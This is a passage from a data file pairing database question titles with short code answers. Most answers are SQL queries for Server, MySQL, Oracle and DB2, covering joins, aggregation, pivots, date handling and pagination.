    @NonMatched = sum(
        case
            when [Operator] = '==' and Variable1 <> Variable2 then 1
            when [Operator] = '<>' and Variable1 = Variable2 then 1
            else 0
        end
    )
from @temp
where LinkingID = 1

if @NonMatched = 0
begin
    -- execute your stored procedure or whatever else set of statements
end
"
37852,45239,Write SQL query to fetch data from below table,"select a.column3 + b.column3 from
mytable a, mytable b
where a.column1 = b.column2
and a.column2 = b.column1;
"
16138,16893,SQL Group by time,"SELECT TOP (100) PERCENT 
    me.Path, 
    MAX(pd.SampleValue) AS Sample, 
    DATEADD(MI, -(DATEPART(MI, pd.DateTime) % 5), pd.DateTime) AS PeriodStart
FROM ...
WHERE ...
GROUP BY me.Path, DATEADD(MI, -(DATEPART(MI, pd.DateTime) % 5), pd.DateTime)
ORDER BY me.Path
"
12961,22178,"How I can add null data to a result set, where it doesn't exist in the DB - without inserting new data","SELECT 
d.device, 
s.service, 
r.hits
FROM dt_devs d
INNER JOIN dt_serv s ON d.serviceID = s.serviceID
LEFT JOIN results r ON d.deviceID = r.deviceID
"
14136,62073,trying to inner join multiple tables but always returning 0 rows,"SELECT       Resources.name
,            ar.resource_id
FROM         Resources r
INNER JOIN   ApplicationsResources ar
ON           r.id = ar.resource_id
INNER JOIN   Applications a
ON           a.id = ar.app_id
"
37437,46848,SQL query - Finding if something exists only if a field is a certain number (MS SQL Server 2012),"SELECT t.*
FROM mytable t
WHERE t.a IN (5,10,15,20)
AND (t.a <> 10 OR EXISTS(
    SELECT 1 FROM mytable t2
    WHERE  t.c = t2.b
) )
"
11420,67225,Insert current date into a date column using T-SQL?,"UPDATE TableName SET [ColumnName] = GETDATE() WHERE UserId = @userId
"
458,45145,Is there a way to query the closest locations on a filter in RethinkDB?,"r.db('db').table('table')
  .filter(function_to_filter)
  .orderBy(function(doc) {
    return r.distance('your_point_to_compare', doc('point'))
  })
"
7209,18836,Postgres: Getting the highest matching log associated with a record?,"SELECT M.NAME,L.EVENT FROM LOG L INNER JOIN MODEL M
ON L.MODELID = M.ID 
WHERE L.ID IN 
(
  SELECT MAX(ID) FROM LOG GROUP BY MODELID
)
"
31614,20970,Convert multiple rows into 1 column without pivot in oracle,"SELECT ID, 
    CODE, 
    SUM(CASE WHEN ACTION = 'VIEWED' THEN 1 ELSE 0 END) Viewed, 
    SUM(CASE WHEN ACTION = 'CLICKED' THEN 1 ELSE 0 END) Clicked, 
    SUM(CASE WHEN ACTION = 'PRINTED' THEN 1 ELSE 0 END) Printed, 
    SUM(CASE WHEN ACTION = 'SCHEDULED' THEN 1 ELSE 0 END) Scheduled
FROM MY_TABLE 
GROUP BY ID,
    CODE
"
23633,1067,How do I query for a max value and return date found,"SELECT
    YourTable.*
    FROM YourTable
        INNER JOIN (SELECT
                        MAX(YourValue) AS YourValue
                        FROM YourTable
                        WHERE YourDate>=_StartDateTime 
                            AND YourDate<=_EndDateTime_
                   ) dt ON YourTable.YourValue=dt.YourValue
"
2644,17647,SQL INNER JOIN and UNION,"select phoneID, make, ISNULL(colorID, 'your_default_value') FROM .....
LEFT JOIN ......
"
32399,40886,Do not return any records if one value exist in a field?,"SELECT id, first, last, category FROM names WHERE
ID NOT IN (SELECT id FROM names where category = 'Tutor')
"
5313,50639,Calculate multiple values with sql with if expression,"SELECT
  room,
  SUM(
    CASE WHEN booked_stop_time - booked_start_time > 0
      THEN booked_stop_time - booked_start_time
      END
  ) AS booked,
  SUM(
    CASE WHEN used_stop_time - used_start_time > 0
      THEN used_stop_time - used_start_time
      END
  ) AS used,
  SUM(
    CASE WHEN invoice_stop_time - invoice_start_time > 0
      THEN invoice_stop_time - invoice_start_time
      END
  ) AS invoice
FROM bookings
"
38209,5934,Convert XML datetime to SQL server timestamp,"declare @xml XML=
'<root>
    <node yourdate=""1958-07-11+01:00"">Some value for 1958-07-11</node>
</root>';

SELECT @xml.value('(/root/node/@yourdate)[1]','datetime') AS YourDate --Look at the time shift!

--and now, how to filter this
declare @xmlMany XML=
'<root>
    <node yourdate=""1958-07-11+01:00"">Some value for 1958-07-11</node>
    <node yourdate=""1999-07-23+01:00"">Some value for 1999-07-11</node>
    <node yourdate=""2016-01-13+01:00"">Some value for 2016-01-13</node>
    <node yourdate=""2016-01-12+01:00"">Some value for 2016-01-12</node>
</root>';

WITH AllNodes AS
(
    SELECT One.Node.value('@yourdate','datetime') AS YourDate
          ,One.Node.value('.','varchar(max)') AS NodeValue
    FROM @xmlMany.nodes('/root/node') AS One(Node)
)
SELECT * 
FROM AllNodes
WHERE YourDate> GETDATE()-7
"
17774,13198,SQL Database column is a DateTime but I want to search by just time,"where datepart(hour, col) between 19 and 23
"
32611,48733,Mysql gaps and islands issue?,"SELECT v,flag,COUNT(*)
  FROM 
     ( SELECT flag
            , CASE WHEN @prev = flag THEN @v:=@v ELSE @v:=@v+1 END v
            , @prev:=flag
         FROM 
            ( SELECT *, score_home + score_away >= 60 flag FROM my_table ) x
         JOIN
            ( SELECT @prev:=NULL,@v:=0) vars
        ORDER
           BY id
     ) n
 GROUP
    BY v,flag;
"
4601,61325,"Table with 3 columns, too difficult for me","SELECT 
      CompanyName, 
      YEAR(date), 
      EXP(SUM(LOG(return))) As AnnualReturn
FROM  yourTable
GROUP BY CompanyName, YEAR(date)
ORDER BY CompanyName, YEAR(date)
"
20443,1346,How do I select a fixed number of rows for each group?,"SELECT x.a,
       x.b,
       x.distance
  FROM (SELECT t.a,
               t.b,
               t.distance
               CASE 
                 WHEN @distance != t.distance THEN @rownum := 1 
                 ELSE @rownum := @rownum + 1 
               END AS rank,
               @distance := t.distance
          FROM TABLE t
          JOIN (SELECT @rownum := 0, @distance := '') r
      ORDER BY t.distance --important for resetting the rownum variable) x
 WHERE x.rank <= 2
ORDER BY x.distance, x.a
"
14097,27537,help with t-sql data aggregation,"select area, s1, s2, s3, s4,
    case when S1 <> 0 then 1 else 0 end +
    case when S2 <> 0 then 1 else 0 end +
    case when S3 <> 0 then 1 else 0 end +
    case when S4 <> 0 then 1 else 0 end as Count
from YourTable
"
5430,54155,SQL query Join with datetime inside,"SELECT * from Table1 a join Table2 b on a.idcat = b.idcat where DATEDIFF(NOW(), dt)<=b.days
"
23654,54423,How can I compare a varchar in SQL Server ignoring tilde character,"SELECT * FROM table WHERE varchar1 = 'variable' COLLATE SQL_LATIN1_GENERAL_CP1_CI_AI;
"
32435,58986,SQL select statement filtering,"declare @UseThree as bit = 1;
if exists (select 1 from testtable where rowval in (10,4))
set @UseThree = 0;

select COUNT(*) 
from testtable
where (@UseThree = 1 AND rowval=3)
    OR
    (@UseThree = 0 AND rowval in (10,4))
"
7538,71721,full outer join by hand,"SELECT  a, b, NULL as c FROM t1
UNION ALL
SELECT  NULL as a, b, c FROM t2
UNION ALL
SELECT  a, NULL as b, c FROM t3
"
13375,5945,Is it possible to do a left outer join where something other than NULL fills the non-values?,"select a.*, (case when a.id is not null then coalesce(ans, -1) end) as ans
from b left join
     a
     on b.answerid = a.id;
"
31779,41904,Rails: making records expire,"@articles = Article.where('semiretirement <= ?', Date.today)
"
13865,3745,SQL Query - Microsoft SQL,"WITH cte
as
(
    SELECT userId, count(*) as c, MAX(date) as lastDate
        FROM SESSIONS
        WHERE userId IN (SELECT userId FROM SESSIONS WHERE DATEPART(year, date) = 2015) -- filter 2015 year
        GROUP BY s.userId
        HAVING count(*) > 2 -- filter at least 3 sessions
)
SELECT u.*, cte.c as sessionCount, cte.lastDate as lastSessionDate
    FROM USERS u
    INNER JOIN cte on u.Id = cte.userId;
"
27535,262,SQL Server identity issue,"Insert into IMDECONP38.[Customer].dbo.CustomerMaster
OUTPUT INSERTED.ID   --change as needed
( CustomerName , CustomerAddress , CustomerEmail , CustomerPhone )
values ( ‘werw12e’ , ‘jkj12kj’ , ‘3212423sdf’ , ‘1212121′
)
"
18622,68891,Limit number of occurances in output group-by sql query,"select 
    rep, companyname, [count], commission
from (
    select 
        rep, companyname,count(companyname) as [count], Commission,
        count(1) over (PARTITION by companyname) as [companycount]
    from customers
    group by repid,companyname,Commission
) sub
where companycount > 1
"
33257,40309,Find rows that have a field which is a substring of the search string,"where value ilike 'foo%'
"
35660,47190,Computed Column - Need help writing statement,"CREATE TABLE [Match](

    [Match Org] [nvarchar](10) NULL,
    [Bypass] [nvarchar](10) NULL,
    [win] AS CASE WHEN  ( [Match Org] = 'yes'    --- equality check is:  =
                       OR [Bypass] = 'yes' )     --- not:  ==
                  THEN 'yes' 
                  ELSE 'no'
             END                                 --- END was missing
        PERSISTED             --- you may also want to make
                              --- the column PERSISTED 
) ON [PRIMARY]
"
16189,36101,Group by - multiple conditions - MySQL,"GROUP BY i.id, d.dtime
"
37154,54307,Data operations,"DECLARE    @conductor_date datetime 
DECLARE    @hour varchar(5) 

DECLARE @hours int
DECLARE @minutes int
DECLARE @offset datetime

SET @conductor_date = '2015-10-15' 
SET @hour = '24:40'

SET @hours = cast(left(@hour, 2) as int)
SET @minutes = cast(right(@hour, 2) as int)
SET @offset = dateadd(day, datediff(day, 0,@conductor_date), 0) -- the begin of the day

SELECT DATEADD(hour, @hours, dateadd(minute, @minutes, @offset))
"
32013,46708,SQL Server OFFSET equivalent,"SELECT some_field
FROM   (
          SELECT some_field, ROW_NUMBER() OVER (ORDER BY some_id) AS rownum
          FROM   table
       ) AS t
WHERE  t.rownum BETWEEN 11 AND 20
"
13505,22910,Match upload spreadsheet columns to table columns,"procedure MM_IN_PARSE
is

begin

DECLARE    
v_blob_data       BLOB;    
v_blob_len        NUMBER;    
v_position        NUMBER;    
v_raw_chunk       RAW(10000);    
v_char      CHAR(1);    
c_chunk_len   number       := 1;    
v_line        VARCHAR2 (32767)        := NULL;    
v_data_array      wwv_flow_global.vc_arr2;    
v_rows number;    
v_sr_no number := 1;  
v_first_line_done boolean := false;  
v_error_cd number :=0;  
v_quote_pos1 NUMBER;  
v_quote_pos2 NUMBER;  
v_enclosed_str VARCHAR2(200);
v_errmsg VARCHAR2(4000);

BEGIN

delete from TEMP_MM_UPDATE where username = v('P1_USER_ID');

-- Read data from wwv_flow_files</span>    
select    
blob_content    
into v_blob_data    
from wwv_flow_files    
where name = v('P2_FILE_UPLOAD'); 

v_blob_len := dbms_lob.getlength(v_blob_data);    
v_position := 1; 

-- Read and convert binary to char</span>  
WHILE ( v_position <= v_blob_len )    
LOOP 
--BEGIN
v_raw_chunk := dbms_lob.substr(v_blob_data,c_chunk_len,v_position);    
v_char :=  chr(hex_to_decimal(rawtohex(v_raw_chunk)));    
v_line := v_line || v_char;    
v_position := v_position + c_chunk_len;

-- When a whole line is retrieved </span>   
IF v_char = CHR(10) THEN

v_line := REPLACE (v_line, '>', NULL);
v_line := REPLACE (v_line, '<', NULL);

LOOP  
--Make sure there's something to replace  
IF INSTR(v_line, '""', 1, 1) = 0 THEN  
EXIT; -- If nothing to replace, exit loop and don't try  
END IF;  
--Find the position of the first and second quotes in the line of text  
v_quote_pos1 := INSTR(v_line, '""', 1, 1);  
v_quote_pos2 := INSTR(v_line, '""', 1, 2);  
--Extract the inner string  
v_enclosed_str := SUBSTR(v_line, v_quote_pos1 + 1, v_quote_pos2 - v_quote_pos1 - 1);  
--perform the replacement  
v_line := SUBSTR(v_line, 0, v_quote_pos1 - 1) || REPLACE(v_enclosed_str, ',', '<') || SUBSTR(v_line, v_quote_pos2 + 1);  
END LOOP; 

-- Convert comma to : to use wwv_flow_utilities </span>
v_line := REPLACE (v_line, ':', NULL);
v_line := REPLACE (v_line, ',', ':');  
v_line := REPLACE (v_line, '<', ',');  
v_line := REPLACE (trim(v_line), '-', NULL);  
v_line := REPLACE (trim(v_line), '', NULL);  
--v_line := REPLACE (trim(v_line), '""', NULL);  
-- Convert each column separated by : into array of data </span>    
v_data_array := wwv_flow_utilities.string_to_table (v_line);  
--Check to see if the row of column headers has already been parsed through  
IF(v_first_line_done != true)THEN   
v_first_line_done := true;  
--Check column order in spreadsheet  
IF(v_data_array(1)      LIKE '%Username%' AND
        v_data_array(2)  LIKE '%NDN%' AND
        v_data_array(3)  LIKE '%PCFN%' AND
        v_data_array(4)  LIKE '%TCN%' AND
        v_data_array(5)  LIKE '%Primary Sea/Air%' AND

        v_data_array(7)  LIKE '%Customer%') THEN   
    v_error_cd := 0;  
    v_line := NULL;  
ELSE  
    v_error_cd := 1;  
END IF;  
--If first line is done and the column order is correct then  
ELSIF(v_first_line_done = true AND v_error_cd = 0 AND v_data_array(1) is not null) THEN   
-- Insert data into target table </span>    
EXECUTE IMMEDIATE 'insert into TEMP_MM_UPDATE   
(USERNAME,
  RPT_FLAG,
 PCFN,
 TCN,
CUSTOMER)
values (:1,:2,:3,:4,:7)'   
   USING   
v_data_array(1),   
v_data_array(2),   
v_data_array(3),   
v_data_array(4),   
v_data_array(7);    
   -- Clear out    
    v_line := NULL; v_sr_no := v_sr_no + 1; 

END IF;  
 END IF; 

/*EXCEPTION
WHEN OTHERS then
v_errmsg := SQLERRM;

v_errmsg := REPLACE(v_errmsg, 'ORA-12899: value too large for column ""APEX01"".""TEMP_MM_UPDATE"".', '');
v_errmsg := REPLACE(v_errmsg, '""', NULL);
v_errmsg := REPLACE(v_errmsg, '(actual:', ' value too large. (current length:');
v_errmsg := REPLACE(v_errmsg, 'maximum:', 'maximum length:');

v_errmsg := REPLACE(v_errmsg, 'ORA-01438: value larger than specified precision allowed for this column', 'Numeric value to large for the column.');

v_errmsg := REPLACE(v_errmsg, 'ORA-01722: invalid number', 'Invalid value in a column expecting a number.');

v_errmsg := REPLACE(v_errmsg, 'ORA-01858: a non-numeric character was found where a numeric was expected', 'Check all date column values for a non-date value.');

v_errmsg := REPLACE(v_errmsg, 'ORA-01830: date format picture ends before converting entire input string', 'Check all date column values.');

v_errmsg := REPLACE(v_errmsg, 'ORA-01847: day of month must be between 1 and last day of month', 'Not a valid date day.');

v_errmsg := REPLACE(v_errmsg, 'ORA-01843: not a valid month', 'Not a valid date month.');

v_errmsg := REPLACE(v_errmsg, 'ORA-01861: literal does not match format string', 'Invalid value format.');

insert into temp_NDN_update (username,pcfn,tcn,error_desc)
values (v('P1_USER_ID'), v_data_array(3),v_data_array(4), v_errmsg); 
v_line := NULL; v_sr_no := v_sr_no + 1;

END;*/

 END LOOP;

DELETE FROM WWV_FLOW_FILES where name = v('P2_FILE_UPLOAD');
 IF(v_error_cd = 1) THEN  
INSERT INTO temp_mm_update (USERNAME, ERROR_DESC)  
VALUES (v('P1_USER_ID'), 'Error. Please check column order in spreadsheet.');  
END IF;

/*EXCEPTION
WHEN NO_DATA_FOUND THEN
insert into temp_mm_update (username,error_desc)
values (v('P1_USER_ID'), 'No Data Found.');*/


END;
"
31142,2713,How to properly exclude rows with references to each other?,"SELECT mx.msg_id, pm.ffrom, pm.tto
FROM tsk_private_message pm
WHERE NOT EXISTS (
    SELECT * FROM tsk_private_message nx1
    WHERE nx1.ffrom = pm.ffrom AND nx1.tto = pm.tto
    AND nx1.msg_id < pm.msg_id
    )
AND NOT EXISTS (
    SELECT * FROM tsk_private_message nx2
    WHERE nx2.ffrom = pm.tto AND nx2.tto = pm.ffrom
    AND nx2.msg_id < pm.msg_id
    );
"
37439,13529,Normalizing table LIMIT issue,"SELECT *
FROM
    (SELECT *
    FROM song
    LIMIT 10) r
LEFT JOIN song_author ON r.s_id = sa_song
LEFT JOIN author ON sa_author = a_id
"
21138,58537,How to convert Oracle to MS SQL with multiple parameters in where clause?,"SELECT company, structure_id, team_code 
   FROM structure_main_tab  smt
   WHERE EXISTS (select null from 
                 structure_main_tab smt1
                 join company_user_tab cut on cut.company = smt1.company and 
                                              cut.structure_id = smt1.parent_structure_id and
                                              cut.team_code = smt1.team_code
                where UPPER(cut.fusername) = UPPER('xxx') AND cut.fdeleted = 'N'  
                and smt.company = smt1.company 
                and smt.parent_structure_id = smt1.structure_id
                and smt.team_code = smt1.team_code)
"
2378,18614,SQL query composition search by 4 tables,"DROP TABLE IF EXISTS lipid;

CREATE TABLE lipid
(ID INT NOT NULL AUTO_INCREMENT PRIMARY KEY
,name VARCHAR(12) NOT NULL UNIQUE     
,mass INT NOT NULL  
,hg CHAR(2) NOT NULL
);

INSERT INTO lipid VALUES
(1   ,'PC 32:2',700,'PC'),(2,'PC 32:1',800,'PC');

DROP TABLE IF EXISTS FA;

CREATE TABLE FA
(ID  INT NOT NULL AUTO_INCREMENT PRIMARY KEY
,name       VARCHAR(12) NOT NULL
,mass INT NOT NULL
);

INSERT INTO fa VALUES 
(1   ,'FA 16:1',300),
(2   ,'FA 16:0',400),
(3   ,'FA 16:2',200);


DROP TABLE IF EXISTS Cat;

CREATE TABLE Cat
(ID  INT NOT NULL AUTO_INCREMENT PRIMARY KEY
,name  VARCHAR(12) NOT NULL
,snpos  TINYINT NOT NULL
,backbone  INT NOT NULL
,LC INT NOT NULL
);

INSERT INTO Cat VALUES
(1   ,'gpl',2,25,1);

DROP TABLE IF EXISTS LC;

CREATE TABLE LC
(ID INT NOT NULL AUTO_INCREMENT PRIMARY KEY
,name  CHAR(2) NOT NULL
,mass INT NOT NULL
);

INSERT INTO LC VALUES (1,'PC',75);

SELECT l.id lipid_id
     , l.name lipid_name
     , l.mass lipid_mass
     , l.hg
     , fa.*
     , c.id cat_id
     , c.name cat_name
     , c.snpos snpos
  FROM lipid l
  JOIN lc
    ON lc.name = l.hg
  JOIN cat c
    ON c.lc = lc.id
  JOIN
     ( SELECT 3 snpos,x.name name_x,x.mass mass_x,y.name name_y,y.mass mass_y,z.name name_z,z.mass mass_z, x.mass+y.mass+z.mass total FROM fa x JOIN fa y ON y.id < x.id JOIN  fa z ON z.id < y.id
       UNION
       SELECT 2      ,x.name, x.mass,y.name,y.mass,NULL,0, x.mass+y.mass FROM fa x JOIN fa y ON y.id < x.id
       UNION
       SELECT 1,name,mass,NULL,0,NULL,0, mass FROM fa
     ) fa
    ON fa.snpos = c.snpos
   AND fa.total = 700-c.backbone-lc.mass 
 WHERE l.mass = 700 
   AND l.hg = 'PC';
+----------+------------+------------+----+-------+---------+--------+---------+--------+--------+--------+-------+--------+----------+-------+
| lipid_id | lipid_name | lipid_mass | hg | snpos | name_x  | mass_x | name_y  | mass_y | name_z | mass_z | total | cat_id | cat_name | snpos |
+----------+------------+------------+----+-------+---------+--------+---------+--------+--------+--------+-------+--------+----------+-------+
|        1 | PC 32:2    |        700 | PC |     2 | FA 16:2 |    200 | FA 16:0 |    400 | NULL   |      0 |   600 |      1 | gpl      |     2 |
+----------+------------+------------+----+-------+---------+--------+---------+--------+--------+--------+-------+--------+----------+-------+
"
18419,45878,SQL- HAVING Clause Issue,"SELECT 
      DISTINCT D.[FISCAL YEAR]
FROM [Dates] AS D
      WHERE CONVERT(INT,d.[Fiscal Year]) 
             >= (SELECT MAX(CONVERT(INT,[Fiscal Year])) -2 from Dates)
"
11063,47860,How to transform a column with multiple numbers into a series of dummy variables?,"=OR(NOT(ISERROR(FIND("" "" & B$1& "" "",$A2))),LEFT($A2,LEN(B$1)+1)=TEXT(B$1,""@"") & "" "",RIGHT($A2,LEN(B$1)+1)="" "" & TEXT(B$1,""@""),TRIM($A2)=TEXT(B$1,""@""))
"
4582,3789,Deleted unreferenced records from table,"declare del_cur cursor
local
forward_only
static
scroll_locks
for
  select 0 from B
;

declare @foo int;

open del_cur;

fetch next from del_cur into @foo;
while @@fetch_status = 0
begin
  begin try
    delete from B where current of del_cur;
  end try
  begin catch
    -- It was referenced, skip
  end catch;

  fetch next from del_cur into @foo;
end;

close del_cur;
deallocate del_cur;
"
24801,60755,sql query to retrieve min to max date and their corresponding values to separate Columns,"WITH cte AS (
  SELECT [ID], [VALUE], ROW_NUMBER() OVER (Partition By [ID], Order By [Dates] ASC) AS RN
)
SELECT [ID], 
MAX(CASE WHEN RN=1 THEN [VALUE] ELSE NULL END) AS FirstDrug,
MAX(CASE WHEN RN=2 THEN [VALUE] ELSE NULL END) AS SecondDrug,
MAX(CASE WHEN RN=3 THEN [VALUE] ELSE NULL END) AS ThirdDrug
FROM cte
GROUP BY [ID]
"
3324,62848,nested SQL queries on one table,"SELECT bld_stat, 
sum(case when bld_type = 'singl_flr' then 1 else 0 end) AS single_flr,
sum(case when bld_type = 'multi_flr' then 1 else 0 end) AS multi_flr,
sum(case when bld_type = 'trailer' then 1 else 0 end) AS trailer,
sum(case when bld_type = 'whs' then 1 else 0 end) AS WHS
FROM bld_inventory
 GROUP BY bld_stat
"
16360,15471,Refer to other SQL SELECT statements aliased as tables in FROM clause,"WITH
table1 AS
        (
        SELECT  field1, field2
        FROM    some_table
        ),
table2 AS
        (
        SELECT  field1, field2
        FROM    other_table, table1
        )
SELECT  *
FROM    table2
"
3569,23768,"Automatical creation of indentity(1,1) but with GUIDs instead of integers","create table Records (
  Id uniqueidentifier primary key default newid(),
  Occasion datetime not null,
  Amount float not null,
  Mileage int not null,
  Information varchar(999) default ' '
)
"
21520,33204,SQL: Get 2 rows from each category,"select distinct c1.ID, c2.category
from mytable c1
join mytable c2 ON c1.category = c2.category and c1.ID <> c2.ID
group by c1.category, c2.ID;
"
22233,12455,DB2 Using LIMIT and OFFSET," SELECT emp.EMPNO, emp.SALARY
 FROM (

     SELECT EMPNO, SALARY, 
            ROW_NUMBER() OVER(ORDER BY SALARY DESC) as row_number
     FROM EMPLOYEE

 ) emp
 WHERE emp.row_number > 10
 AND emp.row_number <= 20
"
9395,30252,MySQL Table UNION ISSUE,"SELECT qa_invoicesitems_returnlog.item_code as item_code, 
       qa_invoicesitems_returnlog.item_unitprice as item_unitprice,
       qa_invoicesitems_returnlog.item_subtotal as item_subtotal,         
       qa_invoicesitems_returnlog.item_discount as item_discount, 
       qa_invoicesitems_returnlog.item_total as item_total 
FROM qa_invoicesitems_returnlog
WHERE qa_invoicesitems_returnlog.returnlog_code = 9
UNION
SELECT qa_invoicesitems.item_code as item_code, 
       qa_invoicesitems.item_unitprice as item_unitprice,
       qa_invoicesitems.item_subtotal as item_subtotal,         
       qa_invoicesitems.item_discount as item_discount, 
       qa_invoicesitems.item_total as item_total 
 FROM qa_invoicesitems   
 WHERE qa_invoicesitems.invoice_code = 17
   AND NOT EXISTS (SELECT * FROM qa_invoicesitems_returnlog qir2
                   WHERE qir2.returnlog_code = 9 
                      and qir2.item_code = qa_invoicesitems.item_code)
"
15021,21323,"Average, Count, etc of entire column of table in SQL Query or as Function in VBA to Display result in Form?","Forms!MyForm!AvgTextBox = Avg([mytable.values2Baveraged])
Forms!MyForm!CountTextBox = Count([mytable.values2Bcounted])
"
33433,39109,sql inserted value of a table as column of another table,"CREATE TABLE #Table1 (ID INT, Name varchar(5))
CREATE TABLE #Table2 (ID INT, Table1ID INT, Value varchar(6))

INSERT INTO #Table1 (ID, Name) SELECT 1, 'Some'
INSERT INTO #Table1 (ID, Name) SELECT 2, 'Some1'
INSERT INTO #Table1 (ID, Name) SELECT 3, 'Some2'
INSERT INTO #Table1 (ID, Name) SELECT 4, 'Some3'

INSERT INTO #Table2 (ID, Table1ID, Value) SELECT 1, 1, 'Value1'
INSERT INTO #Table2 (ID, Table1ID, Value) SELECT 2, 2, 'Value2'
INSERT INTO #Table2 (ID, Table1ID, Value) SELECT 3, 3, 'Value3'

-- List of values to be columns
declare @cols nvarchar(max) 
select @cols = coalesce(@cols+N',', N'') + quotename(Name) from #Table1 order by ID
PRINT @Cols

declare @query varchar(MAX)
SET @query = '
SELECT * 
FROM 
  (
    SELECT T1.Name, T2.Value
    FROM 
        #Table1 T1
         INNER JOIN 
        #Table2 T2 ON 
            T1.ID = T2.Table1ID
  ) s
PIVOT
  (
  MAX(Value) FOR Name IN ('+@Cols+')
  )  p'

PRINT @query
EXEC (@query)

DROP TABLE #Table1
DROP TABLE #Table2
"
13820,40267,Can I give a Stored Procedure permission to SET IDENTITY_INSERT?,"CREATE PROCEDURE [dbo].[AddInternalQu] 
(
    @id [int],
    @qu [nvarchar](500),
    @pg [nvarchar](50),
    @isactive [bit],
    @isdoc [bit],
    @allowNA [bit],
    @textBox [bit],
    @redf [bit],
    @qord [int],
    @shqu [nvarchar](50),
    @restrict [bit],
    @scanwizard [bit]
)
WITH EXECUTE AS OWNER
AS
BEGIN
    SET IDENTITY_INSERT [questions] ON;

    INSERT INTO [questions] (qu_id, question, shortqu, redflag, page, active, is_doc_qu, 
                             allowNA, textBox, qu_order, scanwizard, restricted) 
    VALUES(@id, @qu, @shqu, @redf, @pg, @isactive, @isdoc, 
           @allowNA, @textBox, @qord, @scanwizard, @restrict);

    SET IDENTITY_INSERT [questions] OFF;
END

GRANT EXEC ON AddInternalQu TO MyStandardRole;
"
29733,20809,Trying to average a substring that is data type varchar,"select i.location, avg(convert(int,substring(b.text,8,4)))
from item i
join bib b on i.bib#=b.bib#
where b.tag = '008'
and isNumeric(substring(b.text,8,4))=1
group by i.location
"
39749,52483,"SQL- How would I display a result for each account # start with 3s (Eg 300,301, 302..) in a NOT EXIST statement?"," SELECT 
 AccountNo, 
 AccountDescription
 FROM [AP].[dbo].GLAccounts AS Inv_Main
 WHERE 
 (
     NOT EXISTS   
     (
         Select *
         FROM [AP].[dbo].Vendors AS Inv_Sub
         WHERE 
         (Inv_Main.AccountNo = Inv_Sub.DefaultAccountNo) AND
         (Inv_Main.AccountNo BETWEEN 299 AND 400)
     ) 
 ) 
 ORDER BY AccountNo;
"
8574,57561,How can I combine SQL queries with different expressions?,"With SomeGoodName as
(
  SELECT ...
)
,
AnotherDescriptiveName as
(
  Select ...
)
,
AThirdNiceName as
(
  Select ...
)
SELECT
    T1.DistrictID,
    T1.NumberofSchools,
    T2.NumberofContacts,
    T2.LastActivity,
    T3.NumberofSubscribers,
    T3.LastSent
FROM SomeGoodName T1
JOIN AnotherDescriptiveName T2 ON T1.DistrictID = T2.DistrictID
JOIN AThirdNiceName T3 ON T1.DistrictID = T3.DistrictID
"
11688,22915,Multiple counts and group by,"SELECT
      ProductName,
      ProductCode,
      COUNT(*) as Total
 FROM Table1
 WHERE ProductName IN (SELECT ProductName FROM Table1 GROUP BY ProductName HAVING COUNT(*) > 1)
 GROUP BY ProductName, ProductCode
"
17203,61141,Reuse query value in the same query,"select a.PriorityDefID, a.MilestoneDefID, a.MilestoneName, a.ContactName,
    b.BonusDaysFH as BonusDaysAllotted, a.StartDate, a.EndDate
from GetPerformance a, milestone_def b
where ((a.MilestoneDefID=5) or (a.MilestoneDefID=6) or (a.MilestoneDefID=7))
    and b.MilestoneDefID=a.MilestoneDefID
    and a.PriorityDefID=1
union
select a.PriorityDefID, a.MilestoneDefID, a.MilestoneName, a.ContactName,
    b.BonusDaysFM as BonusDaysAllotted, a.StartDate, a.EndDate
from GetPerformance a, milestone_def b
where ((a.MilestoneDefID=5) or (a.MilestoneDefID=6) or (a.MilestoneDefID=7))
    and b.MilestoneDefID=a.MilestoneDefID
    and a.PriorityDefID=2
union
select a.PriorityDefID, a.MilestoneDefID, a.MilestoneName, a.ContactName,
    b.BonusDaysFL as BonusDaysAllotted, a.StartDate, a.EndDate
from GetPerformance a, milestone_def b
where ((a.MilestoneDefID=5) or (a.MilestoneDefID=6) or (a.MilestoneDefID=7))
    and b.MilestoneDefID=a.MilestoneDefID
    and a.PriorityDefID=3
"
2566,73991,Ordering dt by year and date when some months are missing,"WITH CteTally(N) AS(
    SELECT N FROM(VALUES
        (1), (2), (3), (4), (5), (6), (7), (8), (9), (10), (11), (12)
    )t(N)
),
CteDates(YearPart, MonthPart, YearName, MonthName) AS(
    SELECT
        DATEPART(YEAR, DATEADD(MONTH, t.N - 1, DATEADD(YEAR, a.Y - 1900, 0))),
        DATEPART(MONTH, DATEADD(MONTH, t.N - 1, DATEADD(YEAR, a.Y - 1900, 0))),
        DATENAME(YEAR, DATEADD(MONTH, t.N - 1, DATEADD(YEAR, a.Y - 1900, 0))),
        DATENAME(MONTH, DATEADD(MONTH, t.N - 1, DATEADD(YEAR, a.Y - 1900, 0)))
    FROM(
        SELECT DISTINCT DATEPART(YEAR, call_date) AS Y
        FROM rm_report
    )a
    CROSS JOIN CteTally t
)
SELECT
    COUNT(r.call_date) AS Events,
    d.YearPart,
    d.MonthPart,
    d.YearName,
    d.MonthName
FROM CteDates d
LEFT JOIN rm_report r
    ON d.YearPart = DATEPART(YEAR, r.call_date)
    AND d.YearName= DATENAME(YEAR, r.call_date)
    AND d.MonthPart = DATEPART(MONTH, r.call_date)
    AND d.MonthName = DATENAME(MONTH, r.call_date)
GROUP BY
    d.YearPart, d.YearName, d.MonthPart, d.MonthName
ORDER BY
    d.YearName, d.MonthPart
"
32505,60878,MySQL: Statement with 'LIKE' order by degree of resemblance,"SELECT * 
from table_name 
WHERE column_name LIKE '%inter%'
order by length(column_name) desc
"
2690,45370,Importing xml file in to SQL table,"WITH XMLNAMESPACES('http://www.w.org/20/XMLSchema-instance' AS xsi
                   ,DEFAULT 'http://webservices.de/webservices/franchis/1.03')
,MyXML(XmlContent) AS
(
    SELECT CAST(P AS XML) FROM OPENROWSET (BULK 'C:\xmltest.xml', SINGLE_BLOB) AS Products(P)  
)
SELECT reservation.value('reservationNo[1]','bigint') AS reservationNo
      ,reservation.value('securityCode[1]','nvarchar(max)') AS securityCode
      ,reservation.value('reference1[1]/@xsi:nil','bit') AS reference1IsNull
      ,reservation.value('reference1[1]','nvarchar(max)') AS reference1
      --add other columns following this schema
FROM MyXML
CROSS APPLY MyXML.XmlContent.nodes('/reservationDetailsResponse/reservation') AS A(reservation)
"
29293,38917,"Simple SQL Query problem: how to only ""select"" items from table_A which are also in table_B","SELECT a.wbCode
FROM CountriesList_A a
INNER JOIN CountriesList_B b ON a.wbCode = b.wbCode
"
32726,17432,"MySQL - display rows of names and addresses grouped by name, where name occures more than once","SELECT t.name_id,
       t.last_name,
       a.street_address
  FROM NAME t
